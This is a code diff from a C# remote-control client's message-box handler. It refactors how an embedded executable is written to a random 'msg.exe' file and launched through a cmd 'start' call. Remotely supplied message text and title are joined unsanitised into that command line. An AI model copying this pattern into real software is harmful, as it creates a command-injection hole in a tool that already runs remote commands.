@@ -11,10 +11,10 @@ using RemoteControl.Protocals.Utilities;
 
 namespace RemoteControl.Client.Handlers
 {
-    class RequestMsgBoxHandler : IRequestHandler
+    class RequestMsgBoxHandler : AbstractRequestHandler
     {
         private string lastMsgBoxExeFile = null;
-        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
+        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
         {
             var req = reqObj as RequestMessageBox;
             StartShowMsgBox(session, req);
@@ -27,13 +27,13 @@ namespace RemoteControl.Client.Handlers
                 if (lastMsgBoxExeFile == null || !System.IO.File.Exists(lastMsgBoxExeFile))
                 {
                     // 释放弹窗程序
-                    byte[] data = ResUtil.GetResFileData("MsgBox.dat");
-                    string fileName = ResUtil.WriteToRandomFile(data);
+                    byte[] data = ResUtil.GetResFileData(RES_FILE_NAME);
+                    string fileName = ResUtil.WriteToRandomFile(data, "msg.exe");
                     lastMsgBoxExeFile = fileName;
                 }
                 // 启动弹窗程序
                 string msgBoxArguments = string.Format("{0} {1} {2} {3}", req.Content, req.Title, req.MessageBoxButtons, req.MessageBoxIcons);
-                ProcessUtil.Run("cmd.exe", "/c start " + lastMsgBoxExeFile + " " + msgBoxArguments, true, false);
+                ProcessUtil.RunByCmdStart(lastMsgBoxExeFile + " msgbox " + msgBoxArguments, true);
             }
             catch (Exception ex)
             {
